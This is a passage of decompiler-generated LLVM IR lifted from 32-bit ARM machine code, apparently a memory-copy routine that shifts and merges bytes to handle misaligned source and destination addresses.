  %v4_18dd4 = inttoptr i32 %v3_18dd4 to i32*
  %v5_18dd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18dd4, i32* %v4_18dd4, align 4
  %v6_18dd4 = add i32 %v0_18dd4, 8
  %v7_18dd4 = inttoptr i32 %v6_18dd4 to i32*
  %v8_18dd4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18dd4, i32* %v7_18dd4, align 4
  %v9_18dd4 = add i32 %v0_18dd4, 12
  %v10_18dd4 = inttoptr i32 %v9_18dd4 to i32*
  %v11_18dd4 = load i32, i32* @ip, align 4
  store i32 %v11_18dd4, i32* %v10_18dd4, align 4
  %v12_18dd4 = add i32 %v0_18dd4, 16
  store i32 %v12_18dd4, i32* @r0, align 4
  %v0_18dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18dd8 = add i32 %v0_18dd8, -16
  store i32 %v1_18dd8, i32* %r2.global-to-local, align 4
  %v3_18dd8 = sub i32 15, %v0_18dd8
  %v4_18dd8 = and i32 %v3_18dd8, %v0_18dd8
  %v5_18dd8 = icmp slt i32 %v4_18dd8, 0
  %v6_18dd8 = icmp slt i32 %v1_18dd8, 0
  %v2_18ddc = xor i1 %v6_18dd8, %v5_18dd8
  br i1 %v2_18ddc, label %dec_label_pc_18de0, label %dec_label_pc_18db0.dec_label_pc_18db0_crit_edge

dec_label_pc_18db0.dec_label_pc_18db0_crit_edge:  ; preds = %dec_label_pc_18db0
  %v0_18db0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18db4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18db0

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18db0
  %v2_18de0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18de0, i32* @r4, align 4
  %v5_18de0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18de0, i32* @r5, align 4
  %v1_18de4 = add i32 %v0_18dd8, -4
  store i32 %v1_18de4, i32* %r2.global-to-local, align 4
  %v3_18de4 = add i32 %v0_18dd8, 2147483632
  %v4_18de4 = and i32 %v1_18de4, %v3_18de4
  %v5_18de4 = icmp slt i32 %v4_18de4, 0
  store i1 %v5_18de4, i1* %cpsr_v.global-to-local, align 1
  %v6_18de4 = icmp slt i32 %v1_18de4, 0
  store i1 %v6_18de4, i1* %cpsr_n.global-to-local, align 1
  %v7_18de4 = icmp eq i32 %v1_18de4, 0
  store i1 %v7_18de4, i1* %cpsr_z.global-to-local, align 1
  %v2_18de8 = xor i1 %v6_18de4, %v5_18de4
  br i1 %v2_18de8, label %dec_label_pc_18e04, label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18de0, %dec_label_pc_18da0, %dec_label_pc_18dec
  %v1_18df8 = phi i32 [ %v4_18df8, %dec_label_pc_18dec ], [ %v12_18dd4, %dec_label_pc_18de0 ], [ %v0_18eac76, %dec_label_pc_18da0 ]
  %v0_18dec = load i32, i32* %lr.global-to-local, align 4
  %v3_18dec = udiv i32 %v0_18dec, 256
  store i32 %v3_18dec, i32* %ip.global-to-local, align 4
  %v0_18df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18df0 = inttoptr i32 %v0_18df0 to i32*
  %v2_18df0 = load i32, i32* %v1_18df0, align 4
  store i32 %v2_18df0, i32* %lr.global-to-local, align 4
  %v4_18df0 = add i32 %v0_18df0, 4
  store i32 %v4_18df0, i32* %r1.global-to-local, align 4
  %v4_18df4 = mul i32 %v2_18df0, 16777216
  %v5_18df4 = or i32 %v4_18df4, %v3_18dec
  store i32 %v5_18df4, i32* @ip, align 4
  %v2_18df8 = inttoptr i32 %v1_18df8 to i32*
  store i32 %v5_18df4, i32* %v2_18df8, align 4
  %v3_18df8 = load i32, i32* @r0, align 4
  %v4_18df8 = add i32 %v3_18df8, 4
  store i32 %v4_18df8, i32* @r0, align 4
  %v0_18dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_18dfc = add i32 %v0_18dfc, -4
  store i32 %v1_18dfc, i32* %r2.global-to-local, align 4
  %v3_18dfc = sub i32 3, %v0_18dfc
  %v4_18dfc = and i32 %v3_18dfc, %v0_18dfc
  %v5_18dfc = icmp slt i32 %v4_18dfc, 0
  %v6_18dfc = icmp slt i32 %v1_18dfc, 0
  %v2_18e00 = xor i1 %v6_18dfc, %v5_18dfc
  br i1 %v2_18e00, label %dec_label_pc_18e04.loopexit, label %dec_label_pc_18dec

dec_label_pc_18e04.loopexit:                      ; preds = %dec_label_pc_18dec
  %v7_18dfc = icmp eq i32 %v0_18dfc, 4
  store i1 %v5_18dfc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18dfc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18dfc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18e04

dec_label_pc_18e04:                               ; preds = %dec_label_pc_18e04.loopexit, %dec_label_pc_18de0
  %v0_18d2c59 = phi i32 [ %v1_18dfc, %dec_label_pc_18e04.loopexit ], [ %v1_18de4, %dec_label_pc_18de0 ]
  %v0_18e04 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e04 = add i32 %v0_18e04, -3
  store i32 %v1_18e04, i32* @r1, align 4
  br label %bb140

dec_label_pc_18e0c:                               ; preds = %dec_label_pc_18d8c
  br i1 %v2_18e10, label %dec_label_pc_18e58, label %dec_label_pc_18e14

dec_label_pc_18e14:                               ; preds = %dec_label_pc_18e0c
  store i32 %v1_18e0c, i32* %r2.global-to-local, align 4
  %v3_18e18 = load i32, i32* @r4, align 4
  store i32 %v3_18e18, i32* %stack_var_-16, align 4
  %v6_18e18 = load i32, i32* @r5, align 4
  store i32 %v6_18e18, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18e1c

dec_label_pc_18e1c:                               ; preds = %dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge, %dec_label_pc_18e14
  %v0_18e40 = phi i32 [ %v12_18e40, %dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge ], [ %v0_18eac76, %dec_label_pc_18e14 ]
  %v0_18e20 = phi i32 [ %v0_18e20.pre, %dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge ], [ %v4_18d90, %dec_label_pc_18e14 ]
  %v0_18e1c = phi i32 [ %v0_18e1c.pre, %dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge ], [ %v2_18d90, %dec_label_pc_18e14 ]
  %v3_18e1c = udiv i32 %v0_18e1c, 65536
  %v1_18e20 = inttoptr i32 %v0_18e20 to i32*
  %v2_18e20 = load i32, i32* %v1_18e20, align 4
  store i32 %v2_18e20, i32* %r4.global-to-local, align 4
  %v3_18e20 = add i32 %v0_18e20, 4
  %v4_18e20 = inttoptr i32 %v3_18e20 to i32*
  %v5_18e20 = load i32, i32* %v4_18e20, align 4
  store i32 %v5_18e20, i32* %r5.global-to-local, align 4
  %v6_18e20 = add i32 %v0_18e20, 8
  %v7_18e20 = inttoptr i32 %v6_18e20 to i32*
  %v8_18e20 = load i32, i32* %v7_18e20, align 4
  store i32 %v8_18e20, i32* %ip.global-to-local, align 4
  %v9_18e20 = add i32 %v0_18e20, 12
  %v10_18e20 = inttoptr i32 %v9_18e20 to i32*
  %v11_18e20 = load i32, i32* %v10_18e20, align 4
  store i32 %v11_18e20, i32* %lr.global-to-local, align 4
  %v12_18e20 = add i32 %v0_18e20, 16
  store i32 %v12_18e20, i32* %r1.global-to-local, align 4
  %v4_18e24 = mul i32 %v2_18e20, 65536
  %v5_18e24 = or i32 %v4_18e24, %v3_18e1c
  store i32 %v5_18e24, i32* @r3, align 4
  %v3_18e28 = udiv i32 %v2_18e20, 65536
  %v4_18e2c = mul i32 %v5_18e20, 65536
  %v5_18e2c = or i32 %v4_18e2c, %v3_18e28
  store i32 %v5_18e2c, i32* %r4.global-to-local, align 4
  %v3_18e30 = udiv i32 %v5_18e20, 65536
  %v4_18e34 = mul i32 %v8_18e20, 65536
  %v5_18e34 = or i32 %v4_18e34, %v3_18e30
  store i32 %v5_18e34, i32* %r5.global-to-local, align 4
  %v3_18e38 = udiv i32 %v8_18e20, 65536
  %v4_18e3c = mul i32 %v11_18e20, 65536
  %v5_18e3c = or i32 %v4_18e3c, %v3_18e38
  store i32 %v5_18e3c, i32* @ip, align 4
  %v1_18e40 = inttoptr i32 %v0_18e40 to i32*
  store i32 %v5_18e24, i32* %v1_18e40, align 4
  %v3_18e40 = add i32 %v0_18e40, 4
  %v4_18e40 = inttoptr i32 %v3_18e40 to i32*
  %v5_18e40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18e40, i32* %v4_18e40, align 4
  %v6_18e40 = add i32 %v0_18e40, 8
  %v7_18e40 = inttoptr i32 %v6_18e40 to i32*
  %v8_18e40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18e40, i32* %v7_18e40, align 4
  %v9_18e40 = add i32 %v0_18e40, 12
  %v10_18e40 = inttoptr i32 %v9_18e40 to i32*
  %v11_18e40 = load i32, i32* @ip, align 4
  store i32 %v11_18e40, i32* %v10_18e40, align 4
  %v12_18e40 = add i32 %v0_18e40, 16
  store i32 %v12_18e40, i32* @r0, align 4
  %v0_18e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e44 = add i32 %v0_18e44, -16
  store i32 %v1_18e44, i32* %r2.global-to-local, align 4
  %v3_18e44 = sub i32 15, %v0_18e44
  %v4_18e44 = and i32 %v3_18e44, %v0_18e44
  %v5_18e44 = icmp slt i32 %v4_18e44, 0
  %v6_18e44 = icmp slt i32 %v1_18e44, 0
  %v2_18e48 = xor i1 %v6_18e44, %v5_18e44
  br i1 %v2_18e48, label %dec_label_pc_18e4c, label %dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge

dec_label_pc_18e1c.dec_label_pc_18e1c_crit_edge:  ; preds = %dec_label_pc_18e1c
  %v0_18e1c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18e20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e1c

dec_label_pc_18e4c:                               ; preds = %dec_label_pc_18e1c
  %v2_18e4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18e4c, i32* @r4, align 4
  %v5_18e4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18e4c, i32* @r5, align 4
  %v1_18e50 = add i32 %v0_18e44, -4
  store i32 %v1_18e50, i32* %r2.global-to-local, align 4
  %v3_18e50 = add i32 %v0_18e44, 2147483632
  %v4_18e50 = and i32 %v1_18e50, %v3_18e50
  %v5_18e50 = icmp slt i32 %v4_18e50, 0
  store i1 %v5_18e50, i1* %cpsr_v.global-to-local, align 1
  %v6_18e50 = icmp slt i32 %v1_18e50, 0
  store i1 %v6_18e50, i1* %cpsr_n.global-to-local, align 1
  %v7_18e50 = icmp eq i32 %v1_18e50, 0
  store i1 %v7_18e50, i1* %cpsr_z.global-to-local, align 1
  %v2_18e54 = xor i1 %v6_18e50, %v5_18e50
  br i1 %v2_18e54, label %dec_label_pc_18e70, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e4c, %dec_label_pc_18e0c, %dec_label_pc_18e58
  %v1_18e64 = phi i32 [ %v4_18e64, %dec_label_pc_18e58 ], [ %v12_18e40, %dec_label_pc_18e4c ], [ %v0_18eac76, %dec_label_pc_18e0c ]
  %v0_18e58 = load i32, i32* %lr.global-to-local, align 4
  %v3_18e58 = udiv i32 %v0_18e58, 65536
  store i32 %v3_18e58, i32* %ip.global-to-local, align 4
  %v0_18e5c = load i32, i32* %r1.global-to-local, align 4
  %v1_18e5c = inttoptr i32 %v0_18e5c to i32*
  %v2_18e5c = load i32, i32* %v1_18e5c, align 4
  store i32 %v2_18e5c, i32* %lr.global-to-local, align 4
  %v4_18e5c = add i32 %v0_18e5c, 4
  store i32 %v4_18e5c, i32* %r1.global-to-local, align 4
  %v4_18e60 = mul i32 %v2_18e5c, 65536
  %v5_18e60 = or i32 %v4_18e60, %v3_18e58
  store i32 %v5_18e60, i32* @ip, align 4
  %v2_18e64 = inttoptr i32 %v1_18e64 to i32*
  store i32 %v5_18e60, i32* %v2_18e64, align 4
  %v3_18e64 = load i32, i32* @r0, align 4
  %v4_18e64 = add i32 %v3_18e64, 4
  store i32 %v4_18e64, i32* @r0, align 4
  %v0_18e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e68 = add i32 %v0_18e68, -4
  store i32 %v1_18e68, i32* %r2.global-to-local, align 4
  %v3_18e68 = sub i32 3, %v0_18e68
  %v4_18e68 = and i32 %v3_18e68, %v0_18e68
  %v5_18e68 = icmp slt i32 %v4_18e68, 0
  %v6_18e68 = icmp slt i32 %v1_18e68, 0
  %v2_18e6c = xor i1 %v6_18e68, %v5_18e68
  br i1 %v2_18e6c, label %dec_label_pc_18e70.loopexit, label %dec_label_pc_18e58

dec_label_pc_18e70.loopexit:                      ; preds = %dec_label_pc_18e58
  %v7_18e68 = icmp eq i32 %v0_18e68, 4
  store i1 %v5_18e68, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18e68, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18e68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18e70

dec_label_pc_18e70:                               ; preds = %dec_label_pc_18e70.loopexit, %dec_label_pc_18e4c
  %v0_18d2c60 = phi i32 [ %v1_18e68, %dec_label_pc_18e70.loopexit ], [ %v1_18e50, %dec_label_pc_18e4c ]
  %v0_18e70 = load i32, i32* %r1.global-to-local, align 4
  %v1_18e70 = add i32 %v0_18e70, -2
  store i32 %v1_18e70, i32* @r1, align 4
  br label %bb140

dec_label_pc_18e78:                               ; preds = %dec_label_pc_18d8c
  br i1 %v2_18e10, label %dec_label_pc_18ec4, label %dec_label_pc_18e80

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e78
  store i32 %v1_18e0c, i32* %r2.global-to-local, align 4
  %v3_18e84 = load i32, i32* @r4, align 4
  store i32 %v3_18e84, i32* %stack_var_-16, align 4
  %v6_18e84 = load i32, i32* @r5, align 4
  store i32 %v6_18e84, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e88.dec_label_pc_18e88_crit_edge, %dec_label_pc_18e80
  %v0_18eac = phi i32 [ %v12_18eac, %dec_label_pc_18e88.dec_label_pc_18e88_crit_edge ], [ %v0_18eac76, %dec_label_pc_18e80 ]
  %v0_18e8c = phi i32 [ %v0_18e8c.pre, %dec_label_pc_18e88.dec_label_pc_18e88_crit_edge ], [ %v4_18d90, %dec_label_pc_18e80 ]
  %v0_18e88 = phi i32 [ %v0_18e88.pre, %dec_label_pc_18e88.dec_label_pc_18e88_crit_edge ], [ %v2_18d90, %dec_label_pc_18e80 ]
  %v3_18e88 = udiv i32 %v0_18e88, 16777216
  %v1_18e8c = inttoptr i32 %v0_18e8c to i32*
  %v2_18e8c = load i32, i32* %v1_18e8c, align 4
  store i32 %v2_18e8c, i32* %r4.global-to-local, align 4
  %v3_18e8c = add i32 %v0_18e8c, 4
  %v4_18e8c = inttoptr i32 %v3_18e8c to i32*
  %v5_18e8c = load i32, i32* %v4_18e8c, align 4
  store i32 %v5_18e8c, i32* %r5.global-to-local, align 4
  %v6_18e8c = add i32 %v0_18e8c, 8
  %v7_18e8c = inttoptr i32 %v6_18e8c to i32*
  %v8_18e8c = load i32, i32* %v7_18e8c, align 4
  store i32 %v8_18e8c, i32* %ip.global-to-local, align 4
  %v9_18e8c = add i32 %v0_18e8c, 12
  %v10_18e8c = inttoptr i32 %v9_18e8c to i32*
  %v11_18e8c = load i32, i32* %v10_18e8c, align 4
  store i32 %v11_18e8c, i32* %lr.global-to-local, align 4
  %v12_18e8c = add i32 %v0_18e8c, 16
  store i32 %v12_18e8c, i32* %r1.global-to-local, align 4
  %v4_18e90 = mul i32 %v2_18e8c, 256
  %v5_18e90 = or i32 %v4_18e90, %v3_18e88
  store i32 %v5_18e90, i32* @r3, align 4
  %v3_18e94 = udiv i32 %v2_18e8c, 16777216
  %v4_18e98 = mul i32 %v5_18e8c, 256
  %v5_18e98 = or i32 %v4_18e98, %v3_18e94
  store i32 %v5_18e98, i32* %r4.global-to-local, align 4
  %v3_18e9c = udiv i32 %v5_18e8c, 16777216
  %v4_18ea0 = mul i32 %v8_18e8c, 256
  %v5_18ea0 = or i32 %v4_18ea0, %v3_18e9c
  store i32 %v5_18ea0, i32* %r5.global-to-local, align 4
  %v3_18ea4 = udiv i32 %v8_18e8c, 16777216
  %v4_18ea8 = mul i32 %v11_18e8c, 256
  %v5_18ea8 = or i32 %v4_18ea8, %v3_18ea4
  store i32 %v5_18ea8, i32* @ip, align 4
  %v1_18eac = inttoptr i32 %v0_18eac to i32*
  store i32 %v5_18e90, i32* %v1_18eac, align 4
  %v3_18eac = add i32 %v0_18eac, 4
  %v4_18eac = inttoptr i32 %v3_18eac to i32*
  %v5_18eac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18eac, i32* %v4_18eac, align 4
  %v6_18eac = add i32 %v0_18eac, 8
  %v7_18eac = inttoptr i32 %v6_18eac to i32*
  %v8_18eac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18eac, i32* %v7_18eac, align 4
  %v9_18eac = add i32 %v0_18eac, 12
  %v10_18eac = inttoptr i32 %v9_18eac to i32*
  %v11_18eac = load i32, i32* @ip, align 4
  store i32 %v11_18eac, i32* %v10_18eac, align 4
  %v12_18eac = add i32 %v0_18eac, 16
  store i32 %v12_18eac, i32* @r0, align 4
  %v0_18eb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_18eb0 = add i32 %v0_18eb0, -16
  store i32 %v1_18eb0, i32* %r2.global-to-local, align 4
  %v3_18eb0 = sub i32 15, %v0_18eb0
  %v4_18eb0 = and i32 %v3_18eb0, %v0_18eb0
  %v5_18eb0 = icmp slt i32 %v4_18eb0, 0
  %v6_18eb0 = icmp slt i32 %v1_18eb0, 0
  %v2_18eb4 = xor i1 %v6_18eb0, %v5_18eb0
  br i1 %v2_18eb4, label %dec_label_pc_18eb8, label %dec_label_pc_18e88.dec_label_pc_18e88_crit_edge

dec_label_pc_18e88.dec_label_pc_18e88_crit_edge:  ; preds = %dec_label_pc_18e88
  %v0_18e88.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18e8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e88

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18e88
  %v2_18eb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18eb8, i32* @r4, align 4
  %v5_18eb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18eb8, i32* @r5, align 4
  %v1_18ebc = add i32 %v0_18eb0, -4
  store i32 %v1_18ebc, i32* %r2.global-to-local, align 4
  %v3_18ebc = add i32 %v0_18eb0, 2147483632
  %v4_18ebc = and i32 %v1_18ebc, %v3_18ebc
  %v5_18ebc = icmp slt i32 %v4_18ebc, 0
  store i1 %v5_18ebc, i1* %cpsr_v.global-to-local, align 1
  %v6_18ebc = icmp slt i32 %v1_18ebc, 0
  store i1 %v6_18ebc, i1* %cpsr_n.global-to-local, align 1
  %v7_18ebc = icmp eq i32 %v1_18ebc, 0
  store i1 %v7_18ebc, i1* %cpsr_z.global-to-local, align 1
  %v2_18ec0 = xor i1 %v6_18ebc, %v5_18ebc
  br i1 %v2_18ec0, label %dec_label_pc_18edc, label %dec_label_pc_18ec4

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18eb8, %dec_label_pc_18e78, %dec_label_pc_18ec4
  %v1_18ed0 = phi i32 [ %v4_18ed0, %dec_label_pc_18ec4 ], [ %v12_18eac, %dec_label_pc_18eb8 ], [ %v0_18eac76, %dec_label_pc_18e78 ]
  %v0_18ec4 = load i32, i32* %lr.global-to-local, align 4
  %v3_18ec4 = udiv i32 %v0_18ec4, 16777216
  store i32 %v3_18ec4, i32* %ip.global-to-local, align 4
  %v0_18ec8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ec8 = inttoptr i32 %v0_18ec8 to i32*
  %v2_18ec8 = load i32, i32* %v1_18ec8, align 4
  store i32 %v2_18ec8, i32* %lr.global-to-local, align 4
  %v4_18ec8 = add i32 %v0_18ec8, 4
  store i32 %v4_18ec8, i32* %r1.global-to-local, align 4
  %v4_18ecc = mul i32 %v2_18ec8, 256
  %v5_18ecc = or i32 %v4_18ecc, %v3_18ec4
  store i32 %v5_18ecc, i32* @ip, align 4
  %v2_18ed0 = inttoptr i32 %v1_18ed0 to i32*
  store i32 %v5_18ecc, i32* %v2_18ed0, align 4
  %v3_18ed0 = load i32, i32* @r0, align 4
  %v4_18ed0 = add i32 %v3_18ed0, 4
  store i32 %v4_18ed0, i32* @r0, align 4
  %v0_18ed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ed4 = add i32 %v0_18ed4, -4
  store i32 %v1_18ed4, i32* %r2.global-to-local, align 4
  %v3_18ed4 = sub i32 3, %v0_18ed4
  %v4_18ed4 = and i32 %v3_18ed4, %v0_18ed4
  %v5_18ed4 = icmp slt i32 %v4_18ed4, 0
  %v6_18ed4 = icmp slt i32 %v1_18ed4, 0
  %v2_18ed8 = xor i1 %v6_18ed4, %v5_18ed4
  br i1 %v2_18ed8, label %dec_label_pc_18edc.loopexit, label %dec_label_pc_18ec4

dec_label_pc_18edc.loopexit:                      ; preds = %dec_label_pc_18ec4
  %v7_18ed4 = icmp eq i32 %v0_18ed4, 4
  store i1 %v5_18ed4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18ed4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18ed4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18edc.loopexit, %dec_label_pc_18eb8
  %v0_18d2c61 = phi i32 [ %v1_18ed4, %dec_label_pc_18edc.loopexit ], [ %v1_18ebc, %dec_label_pc_18eb8 ]
  %v0_18edc = load i32, i32* %r1.global-to-local, align 4
  %v1_18edc = add i32 %v0_18edc, -1
  store i32 %v1_18edc, i32* @r1, align 4
  br label %bb140

dec_label_pc_18ee4:                               ; preds = %entry
  %v1_18ee4 = load i32, i32* @r2, align 4
  %v2_18ee4 = add i32 %v1_18ee4, %v0_18c90
  store i32 %v2_18ee4, i32* %r1.global-to-local, align 4
  %v2_18ee8 = add i32 %v1_18ee4, %v1_18c90
  store i32 %v2_18ee8, i32* %r0.global-to-local, align 4
  %v2_18eec = add i32 %v1_18ee4, -4
  store i32 %v2_18eec, i32* %r2.global-to-local, align 4
  %v4_18eec = sub i32 3, %v1_18ee4
  %v5_18eec = and i32 %v4_18eec, %v1_18ee4
  %v6_18eec = icmp slt i32 %v5_18eec, 0
  store i1 %v6_18eec, i1* %cpsr_v.global-to-local, align 1
  %v7_18eec = icmp slt i32 %v2_18eec, 0
  store i1 %v7_18eec, i1* %cpsr_n.global-to-local, align 1
  %v8_18eec = icmp eq i32 %v1_18ee4, 4
  store i1 %v8_18eec, i1* %cpsr_z.global-to-local, align 1
  %v5_18ef0 = icmp slt i32 %v1_18ee4, 4
  br i1 %v5_18ef0, label %bb150, label %dec_label_pc_18ef4

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18ee4
  %v1_18ef4 = urem i32 %v2_18ee8, 4
  store i32 %v1_18ef4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18ef4 = icmp eq i32 %v1_18ef4, 0
  store i1 %v2_18ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ef4, label %dec_label_pc_18efc, label %dec_label_pc_18f9c

dec_label_pc_18efc:                               ; preds = %dec_label_pc_18ef4
  %v1_18efc = urem i32 %v2_18ee4, 4
  store i32 %v1_18efc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18efc = icmp eq i32 %v1_18efc, 0
  store i1 %v2_18efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18efc, label %dec_label_pc_18f04, label %dec_label_pc_18fc8

dec_label_pc_18f04:                               ; preds = %dec_label_pc_18efc, %dec_label_pc_18fc0
  %v0_18f1c37 = phi i32 [ %v2_18ee8, %dec_label_pc_18efc ], [ %v0_1901020, %dec_label_pc_18fc0 ]
  %v0_18f1836 = phi i32 [ %v2_18ee4, %dec_label_pc_18efc ], [ %v0_18fc0, %dec_label_pc_18fc0 ]
  %v0_18f04 = phi i32 [ %v2_18eec, %dec_label_pc_18efc ], [ %v2_18fb8, %dec_label_pc_18fc0 ]
  %v2_18f04 = add i32 %v0_18f04, -8
  store i32 %v2_18f04, i32* %r2.global-to-local, align 4
  %v4_18f04 = sub i32 7, %v0_18f04
  %v5_18f04 = and i32 %v4_18f04, %v0_18f04
  %v6_18f04 = icmp slt i32 %v5_18f04, 0
  store i1 %v6_18f04, i1* %cpsr_v.global-to-local, align 1
  %v7_18f04 = icmp slt i32 %v2_18f04, 0
  store i1 %v7_18f04, i1* %cpsr_n.global-to-local, align 1
  %v8_18f04 = icmp eq i32 %v0_18f04, 8
  store i1 %v8_18f04, i1* %cpsr_z.global-to-local, align 1
  %v5_18f08 = icmp slt i32 %v0_18f04, 8
  br i1 %v5_18f08, label %dec_label_pc_18f54, label %dec_label_pc_18f0c

dec_label_pc_18f0c:                               ; preds = %dec_label_pc_18f04
  %v3_18f0c = load i32, i32* @r4, align 4
  %v5_18f0c = inttoptr i32 %v3_18f0c to i8*
  store i8* %v5_18f0c, i8** %stack_var_-8, align 4
  %v8_18f0c = load i32, i32* @lr, align 4
  %v2_18f10 = add i32 %v0_18f04, -28
  store i32 %v2_18f10, i32* %r2.global-to-local, align 4
  %v4_18f10 = sub i32 27, %v0_18f04
  %v5_18f10 = and i32 %v4_18f10, %v2_18f04
  %v6_18f10 = icmp slt i32 %v5_18f10, 0
  store i1 %v6_18f10, i1* %cpsr_v.global-to-local, align 1
  %v7_18f10 = icmp slt i32 %v2_18f10, 0
  store i1 %v7_18f10, i1* %cpsr_n.global-to-local, align 1
  %v8_18f10 = icmp eq i32 %v2_18f04, 20
  store i1 %v8_18f10, i1* %cpsr_z.global-to-local, align 1
  %v5_18f14 = icmp slt i32 %v2_18f04, 20
  br i1 %v5_18f14, label %dec_label_pc_18f30, label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %dec_label_pc_18f0c, %dec_label_pc_18f18.dec_label_pc_18f18_crit_edge
  %v0_18f1c = phi i32 [ %v1_18f24, %dec_label_pc_18f18.dec_label_pc_18f18_crit_edge ], [ %v0_18f1c37, %dec_label_pc_18f0c ]
  %v0_18f18 = phi i32 [ %v0_18f18.pre, %dec_label_pc_18f18.dec_label_pc_18f18_crit_edge ], [ %v0_18f1836, %dec_label_pc_18f0c ]
  %v1_18f18 = add i32 %v0_18f18, -4
  %v2_18f18 = inttoptr i32 %v1_18f18 to i32*
  %v3_18f18 = load i32, i32* %v2_18f18, align 4
  %v4_18f18 = add i32 %v0_18f18, -8
  %v5_18f18 = inttoptr i32 %v4_18f18 to i32*
  %v6_18f18 = load i32, i32* %v5_18f18, align 4
  store i32 %v6_18f18, i32* %r4.global-to-local, align 4
  %v7_18f18 = add i32 %v0_18f18, -12
  %v8_18f18 = inttoptr i32 %v7_18f18 to i32*
  %v9_18f18 = load i32, i32* %v8_18f18, align 4
  store i32 %v9_18f18, i32* %ip.global-to-local, align 4
  %v10_18f18 = add i32 %v0_18f18, -16
  %v11_18f18 = inttoptr i32 %v10_18f18 to i32*
  %v12_18f18 = load i32, i32* %v11_18f18, align 4
  store i32 %v12_18f18, i32* %lr.global-to-local, align 4
  store i32 %v10_18f18, i32* %r1.global-to-local, align 4
  %v1_18f1c = add i32 %v0_18f1c, -16
  %v2_18f1c = inttoptr i32 %v1_18f1c to i32*
  store i32 %v3_18f18, i32* %v2_18f1c, align 4
  %v4_18f1c = add i32 %v0_18f1c, -12
  %v5_18f1c = inttoptr i32 %v4_18f1c to i32*
  %v6_18f1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18f1c, i32* %v5_18f1c, align 4
  %v7_18f1c = add i32 %v0_18f1c, -8
  %v8_18f1c = inttoptr i32 %v7_18f1c to i32*
  %v9_18f1c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18f1c, i32* %v8_18f1c, align 4
  %v10_18f1c = add i32 %v0_18f1c, -4
  %v11_18f1c = inttoptr i32 %v10_18f1c to i32*
  %v12_18f1c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18f1c, i32* %v11_18f1c, align 4
  store i32 %v1_18f1c, i32* %r0.global-to-local, align 4
  %v0_18f20 = load i32, i32* %r1.global-to-local, align 4
  %v1_18f20 = add i32 %v0_18f20, -4
  %v2_18f20 = inttoptr i32 %v1_18f20 to i32*
  %v3_18f20 = load i32, i32* %v2_18f20, align 4
  store i32 %v3_18f20, i32* @r3, align 4
  %v4_18f20 = add i32 %v0_18f20, -8
  %v5_18f20 = inttoptr i32 %v4_18f20 to i32*
  %v6_18f20 = load i32, i32* %v5_18f20, align 4
  store i32 %v6_18f20, i32* %r4.global-to-local, align 4
  %v7_18f20 = add i32 %v0_18f20, -12
  %v8_18f20 = inttoptr i32 %v7_18f20 to i32*
  %v9_18f20 = load i32, i32* %v8_18f20, align 4
  store i32 %v9_18f20, i32* @ip, align 4
  %v10_18f20 = add i32 %v0_18f20, -16
  %v11_18f20 = inttoptr i32 %v10_18f20 to i32*
  %v12_18f20 = load i32, i32* %v11_18f20, align 4
  store i32 %v12_18f20, i32* %lr.global-to-local, align 4
  store i32 %v10_18f20, i32* %r1.global-to-local, align 4
